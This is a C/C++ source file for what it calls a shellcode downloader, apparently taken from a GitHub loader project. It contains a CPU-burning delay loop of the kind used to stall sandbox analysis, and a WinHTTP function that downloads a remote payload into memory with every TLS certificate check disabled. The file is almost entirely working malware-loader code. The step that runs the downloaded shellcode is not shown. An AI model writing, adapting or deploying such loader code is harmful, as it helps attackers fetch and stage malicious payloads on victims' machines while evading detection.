#include "shellcode_downloader.h"
#include <winhttp.h>
#include <stdio.h>
#include <math.h>
#include <iostream>
#pragma comment(lib, "winhttp.lib")

// from https://github.com/1K0ng/C_Sep_Loader
void delay_execution() {
    for (int i = 2; i <= 2000000; ++i) {
        int isPrime = 1;
        for (int j = 2; j <= sqrt(i); ++j) {
            if (i % j == 0) {
                isPrime = 0;
                break;
            }
        }
    }
}

void print_last_error(const char* msg) {
    DWORD error_code = GetLastError();
    LPVOID error_msg;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error_code,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&error_msg,
        0, NULL);

    fprintf(stderr, "%s failed with error %u: %s\n", msg, error_code, (char*)error_msg);
    LocalFree(error_msg);
}

unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    unsigned char* payload = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t hostName[256];
    wchar_t urlPath[256];

    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
        print_last_error("WinHttpCrackUrl");
        return NULL;
    }

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        print_last_error("WinHttpOpen");
        return NULL;
    }

    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (!hConnect) {
        print_last_error("WinHttpConnect");
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        print_last_error("WinHttpOpenRequest");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    // Ignore SSL certificate errors (for testing purposes) 直接忽略加载链接ssl错误
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        print_last_error("WinHttpSendRequest");
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        print_last_error("WinHttpReceiveResponse");
    }

    if (bResults) {
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                print_last_error("WinHttpQueryDataAvailable");
                break;
            }

            if (dwSize == 0) {
                break;
            }

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                fprintf(stderr, "Out of memory\n");
                dwSize = 0;
                break;
            }
            else {
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    print_last_error("WinHttpReadData");
                    free(pszOutBuffer);
                    break;
                }
                else {
                    unsigned char* temp_payload = (unsigned char*)realloc(payload, *payload_size + dwDownloaded);
                    if (temp_payload == NULL) {
                        fprintf(stderr, "Memory allocation failed\n");
                        free(pszOutBuffer);
                        if (payload) free(payload);
                        return NULL;
                    }
                    payload = temp_payload;
                    memcpy(payload + *payload_size, pszOutBuffer, dwDownloaded);
                    *payload_size += dwDownloaded;
                }
                free(pszOutBuffer);
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (*payload_size == 0 && payload) {
        free(payload);
        payload = NULL;
    }

    return payload;
}
